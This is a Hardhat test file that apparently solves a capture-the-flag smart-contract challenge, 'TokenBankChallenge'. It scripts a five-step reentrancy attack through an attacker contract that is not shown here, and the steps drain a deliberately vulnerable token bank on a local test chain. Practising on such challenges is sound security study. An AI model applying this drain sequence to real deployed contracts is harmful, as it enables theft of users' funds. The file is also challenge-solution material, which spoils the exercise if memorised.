import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    const [targetFactory, tokenFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge', deployer),
      ethers.getContractFactory('SimpleERC223Token', deployer),
    ]);

    target = await targetFactory.deploy(attacker.address);

    await target.deployed();

    const tokenAddress = await target.token();

    token = await tokenFactory.attach(tokenAddress);

    await token.deployed();

    target = target.connect(attacker);
    token = token.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE thanks 
     * */

    const attackerFactory = await ethers.getContractFactory('TokenBankChallengeAttacker');
    const hackContract = await attackerFactory.connect(attacker).deploy(target.address);
    await hackContract.deployed();

    console.log('Attacker deployed to:', hackContract.address);

    // 1 - withdraw tokens to hacker account
    console.log('1 - withdraw tokens to hacker account');
    const hackerTokenBalance = await target.connect(attacker).balanceOf(attacker.address);
    const tx1 = await target.connect(attacker).withdraw(hackerTokenBalance);
    await tx1.wait();

    // 2 - deposit tokens to attacker contract through target
    console.log('2 - deposit tokens to attacker contract through target');
    const tx2 = await token.connect(attacker)['transfer(address,uint256)'](hackContract.address, hackerTokenBalance);
    await tx2.wait();

    // 3 - transfer tokens to target from contract
    console.log('3 - transfer tokens to target from contract');
    const tx3 = await hackContract.connect(attacker).transfer();
    await tx3.wait();

    // 4 - attack and reentrancy
    console.log('4 - attack and reentrancy');
    const tx4 = await hackContract.connect(attacker).attack();
    await tx4.wait();

    // 5 - withdraw to owner
    console.log('5 - withdraw to owner');
    const tx5 = await hackContract.connect(attacker).withdraw();
    await tx5.wait();



    

    expect(await token.balanceOf(target.address)).to.equal(0);
    expect(await token.balanceOf(attacker.address)).to.equal(
      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    );
  });
});